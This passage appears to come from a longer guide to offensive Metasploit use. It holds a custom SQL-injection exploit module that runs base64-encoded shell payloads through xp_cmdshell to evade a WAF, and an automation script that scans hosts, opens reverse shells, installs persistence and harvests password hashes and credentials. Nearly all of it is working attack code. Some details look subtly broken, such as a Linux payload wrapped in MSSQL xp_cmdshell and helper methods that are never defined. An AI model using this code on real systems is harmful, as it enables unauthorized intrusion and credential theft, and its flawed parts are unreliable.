        fail_with(Failure::NoAccess, "Authentication failed")
      end
    end

    # Step 2: Discover injection point
    injection_point = find_injection_point
    unless injection_point
      fail_with(Failure::NotVulnerable, "No injection point found")
    end

    print_good("Found injection point: #{injection_point}")

    # Step 3: Generate and encode payload
    encoded_payload = generate_payload
    
    # Step 4: Execute exploit
    print_status("Sending exploit payload...")
    execute_exploit(injection_point, encoded_payload)
  end

  private

  def authenticate
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI'], 'login.php'),
      'vars_post' => {
        'username' => datastore['USERNAME'],
        'password' => datastore['PASSWORD']
      }
    })

    return res && res.code == 302 && res.headers['Location'] =~ /dashboard/
  end

  def find_injection_point
    test_parameters = ['id', 'user', 'page', 'file', 'cmd']
    
    test_parameters.each do |param|
      res = send_request_cgi({
        'method' => 'GET',
        'uri' => normalize_uri(datastore['TARGETURI'], 'index.php'),
        'vars_get' => {
          param => "test'; SELECT 1; --"
        }
      })

      if res && res.body =~ /SQL syntax error/
        return param
      end
    end

    nil
  end

  def generate_payload
    # Create custom payload based on target
    case target.platform.platforms.first
    when Msf::Module::Platform::Linux
      return generate_linux_payload
    when Msf::Module::Platform::Windows
      return generate_windows_payload
    else
      return payload.encoded
    end
  end

  def generate_linux_payload
    # Linux-specific payload generation
    shell_payload = payload.encoded
    
    # Add encoding/obfuscation for WAF bypass
    encoded = Rex::Text.encode_base64(shell_payload)
    
    # Wrap in SQL injection context
    sql_payload = "'; EXEC xp_cmdshell('echo #{encoded} | base64 -d | sh'); --"
    
    return sql_payload
  end

  def generate_windows_payload
    # Windows-specific payload generation
    shell_payload = payload.encoded
    
    # PowerShell encoding
    ps_encoded = Rex::Text.encode_base64(shell_payload)
    
    # Wrap in SQL injection context
    sql_payload = "'; EXEC xp_cmdshell('powershell -enc #{ps_encoded}'); --"
    
    return sql_payload
  end

  def execute_exploit(injection_point, payload)
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI'], 'process.php'),
      'vars_post' => {
        injection_point => payload
      }
    })

    if res && res.code == 200
      print_good("Exploit sent successfully")
      
      # Check for successful exploitation indicators
      if res.body =~ /Command executed|Shell spawned/
        print_good("Exploitation appears successful")
      end
    else
      fail_with(Failure::UnexpectedReply, "Failed to send exploit")
    end
  end
end
```

**2. Metasploit Automation Scripts**

```ruby
#!/usr/bin/env ruby

# Advanced Metasploit automation script
require 'msf/core'
require 'msf/core/db'
require 'metasploit/framework/database'

class MetasploitAutomation
  def initialize
    @framework = Msf::Simple::Framework.create(
      'DisableDatabase' => false,
      'DisableLogging' => false
    )
    
    # Initialize database
    @framework.db.connect({
      'adapter' => 'postgresql',
      'database' => 'msf',
      'username' => 'msf',
      'password' => 'msf',
      'host' => '127.0.0.1',
      'port' => 5432
    })
  end

  def automated_exploitation_workflow(targets)
    results = []
    
    targets.each do |target|
      puts "[+] Processing target: #{target[:host]}:#{target[:port]}"
      
      # Phase 1: Port scanning and service detection
      scan_results = perform_port_scan(target)
      
      # Phase 2: Vulnerability identification
      vulnerabilities = identify_vulnerabilities(scan_results)
      
      # Phase 3: Exploit execution
      exploit_results = execute_exploits(vulnerabilities)
      
      # Phase 4: Post-exploitation
      post_exploit_results = post_exploitation(exploit_results)
      
      target_results = {
        target: target,
        scan_results: scan_results,
        vulnerabilities: vulnerabilities,
        exploits: exploit_results,
        post_exploit: post_exploit_results
      }
      
      results << target_results
    end
    
    # Generate comprehensive report
    generate_report(results)
    
    results
  end

  def perform_port_scan(target)
    puts "[+] Performing port scan on #{target[:host]}"
    
    # Use auxiliary scanner modules
    scanner = @framework.auxiliary.create('scanner/portscan/tcp')
    scanner.datastore['RHOSTS'] = target[:host]
    scanner.datastore['PORTS'] = target[:ports] || '1-65535'
    scanner.datastore['THREADS'] = 50
    
    scanner.run_simple(
      'LocalInput' => Rex::Ui::Text::Input::Stdio.new,
      'LocalOutput' => Rex::Ui::Text::Output::Stdio.new
    )
    
    # Get results from database
    services = @framework.db.services(address: target[:host])
    
    scan_results = services.map do |service|
      {
        port: service.port,
        protocol: service.proto,
        state: service.state,
        name: service.name,
        info: service.info
      }
    end
    
    puts "[+] Found #{scan_results.length} services"
    scan_results
  end

  def identify_vulnerabilities(scan_results)
    vulnerabilities = []
    
    scan_results.each do |service|
      # Check for known vulnerabilities based on service
      vulns = check_service_vulnerabilities(service)
      vulnerabilities.concat(vulns)
    end
    
    puts "[+] Identified #{vulnerabilities.length} potential vulnerabilities"
    vulnerabilities
  end

  def check_service_vulnerabilities(service)
    vulnerabilities = []
    
    case service[:name]
    when /ssh/i
      vulnerabilities.concat(check_ssh_vulnerabilities(service))
    when /http/i, /https/i
      vulnerabilities.concat(check_web_vulnerabilities(service))
    when /ftp/i
      vulnerabilities.concat(check_ftp_vulnerabilities(service))
    when /smb/i, /netbios/i
      vulnerabilities.concat(check_smb_vulnerabilities(service))
    end
    
    vulnerabilities
  end

  def check_ssh_vulnerabilities(service)
    vulnerabilities = []
    
    # Check for SSH version vulnerabilities
    if service[:info] =~ /OpenSSH ([0-9.]+)/
      version = $1
      
      # Example: Check for specific OpenSSH vulnerabilities
      if Gem::Version.new(version) < Gem::Version.new('7.4')
        vulnerabilities << {
          service: service,
          type: 'ssh_user_enum',
          module: 'auxiliary/scanner/ssh/ssh_enumusers',
          severity: 'medium'
        }
      end
    end
    
    vulnerabilities
  end

  def check_web_vulnerabilities(service)
    vulnerabilities = []
    
    # Web application vulnerability checks
    vulnerabilities << {
      service: service,
      type: 'web_dir_scan',
      module: 'auxiliary/scanner/http/dir_scanner',
      severity: 'info'
    }
    
    vulnerabilities << {
      service: service,
      type: 'web_sql_injection',
      module: 'auxiliary/scanner/http/sql_injection',
      severity: 'high'
    }
    
    vulnerabilities
  end

  def execute_exploits(vulnerabilities)
    exploit_results = []
    
    vulnerabilities.each do |vuln|
      puts "[+] Attempting to exploit #{vuln[:type]}"
      
      begin
        result = execute_single_exploit(vuln)
        exploit_results << result if result
      rescue => e
        puts "[-] Exploit failed: #{e.message}"
      end
    end
    
    exploit_results
  end

  def execute_single_exploit(vulnerability)
    # Load appropriate exploit module
    if vulnerability[:module].start_with?('exploit/')
      exploit = @framework.exploits.create(vulnerability[:module])
    else
      exploit = @framework.auxiliary.create(vulnerability[:module])
    end
    
    return nil unless exploit
    
    # Configure exploit
    exploit.datastore['RHOST'] = vulnerability[:service][:host]
    exploit.datastore['RPORT'] = vulnerability[:service][:port]
    
    # Set payload if exploit module
    if exploit.is_a?(Msf::Exploit)
      payload = @framework.payloads.create('generic/shell_reverse_tcp')
      payload.datastore['LHOST'] = get_local_ip
      payload.datastore['LPORT'] = get_available_port
      exploit.datastore['PAYLOAD'] = payload.refname
    end
    
    # Execute exploit
    session = exploit.exploit_simple(
      'LocalInput' => Rex::Ui::Text::Input::Stdio.new,
      'LocalOutput' => Rex::Ui::Text::Output::Stdio.new,
      'Payload' => payload&.refname
    )
    
    if session
      puts "[+] Successfully exploited #{vulnerability[:type]}"
      {
        vulnerability: vulnerability,
        session: session,
        session_id: session.sid,
        success: true
      }
    else
      puts "[-] Exploit failed for #{vulnerability[:type]}"
      {
        vulnerability: vulnerability,
        session: nil,
        success: false
      }
    end
  end

  def post_exploitation(exploit_results)
    post_results = []
    
    exploit_results.each do |result|
      next unless result[:success] && result[:session]
      
      session = result[:session]
      puts "[+] Running post-exploitation on session #{session.sid}"
      
      # System information gathering
      sysinfo = gather_system_info(session)
      
      # Privilege escalation
      privesc_result = attempt_privilege_escalation(session)
      
      # Persistence
      persistence_result = establish_persistence(session)
      
      # Credential harvesting
      credentials = harvest_credentials(session)
      
      post_results << {
        session_id: session.sid,
        system_info: sysinfo,
        privilege_escalation: privesc_result,
        persistence: persistence_result,
        credentials: credentials
      }
    end
    
    post_results
  end

  def gather_system_info(session)
    info = {}
    
    # Run sysinfo command
    if session.type == 'meterpreter'
      info[:sysinfo] = session.sys.config.sysinfo
      info[:getuid] = session.sys.config.getuid
    else
      # Shell session
      info[:uname] = session.shell_command_token('uname -a')
      info[:whoami] = session.shell_command_token('whoami')
    end
    
    info
  end

  def attempt_privilege_escalation(session)
    # Attempt various privilege escalation techniques
    if session.platform =~ /windows/i
      return windows_privilege_escalation(session)
    else
      return linux_privilege_escalation(session)
    end
  end

  def establish_persistence(session)
    # Establish persistence mechanisms
    persistence_modules = [
      'post/windows/manage/persistence_exe',
      'post/linux/manage/sshkey_persistence'
    ]
    
    persistence_modules.each do |mod_name|
      begin
        mod = @framework.post.create(mod_name)
        mod.datastore['SESSION'] = session.sid
        
        result = mod.run_simple(
          'LocalInput' => Rex::Ui::Text::Input::Stdio.new,
          'LocalOutput' => Rex::Ui::Text::Output::Stdio.new
        )
        
        return { module: mod_name, success: true } if result
      rescue
        next
      end
    end
    
    { success: false }
  end

  def harvest_credentials(session)
    # Credential harvesting
    cred_modules = [
      'post/windows/gather/credentials/credential_collector',
      'post/linux/gather/hashdump'
    ]
    
    credentials = []
    
    cred_modules.each do |mod_name|
      begin
        mod = @framework.post.create(mod_name)
        mod.datastore['SESSION'] = session.sid
        
        mod.run_simple(
          'LocalInput' => Rex::Ui::Text::Input::Stdio.new,
          'LocalOutput' => Rex::Ui::Text::Output::Stdio.new
        )
        
        # Extract credentials from database
        creds = @framework.db.creds
        credentials.concat(creds.map { |c| { username: c.public, password: c.private } })
      rescue
        next
      end
    end
    
    credentials
  end

  private

  def get_local_ip
    # Get local IP address
    require 'socket'
    Socket.ip_address_list.detect{|intf| intf.ipv4_private?}.ip_address
  end

  def get_available_port
    # Find available port
    server = TCPServer.new('127.0.0.1', 0)
    port = server.addr[1]
    server.close
    port
  end

  def generate_report(results)
    # Generate comprehensive penetration testing report
    report_content = generate_html_report(results)
    
    File.open("metasploit_report_#{Time.now.strftime('%Y%m%d_%H%M%S')}.html", 'w') do |f|
      f.write(report_content)
    end
  end

  def generate_html_report(results)
    # HTML report generation logic
    html = <<~HTML
      <!DOCTYPE html>
      <html>
      <head>
          <title>Metasploit Automation Report</title>
          <style>
              body { font-family: Arial, sans-serif; margin: 20px; }
              .target { border: 1px solid #ccc; margin: 20px 0; padding: 15px; }
              .success { color: green; }
              .failure { color: red; }
              .info { color: blue; }
          </style>
      </head>
      <body>
          <h1>Metasploit Automation Report</h1>
          <p>Generated: #{Time.now}</p>
          
          #{results.map { |r| generate_target_section(r) }.join("\n")}
      </body>
      </html>
    HTML
    
    html
  end

  def generate_target_section(result)
    # Generate HTML section for each target
    "<div class='target'><h2>Target: #{result[:target][:host]}</h2>...</div>"
  end
end

# Usage example
if __FILE__ == $0
  automation = MetasploitAutomation.new
  
  targets = [
    { host: '192.168.1.10', ports: '1-1000' },
    { host: '192.168.1.20', ports: '1-1000' }
  ]
  
  results = automation.automated_exploitation_workflow(targets)
  puts "[+] Automation complete. Results for #{results.length} targets."
end
```
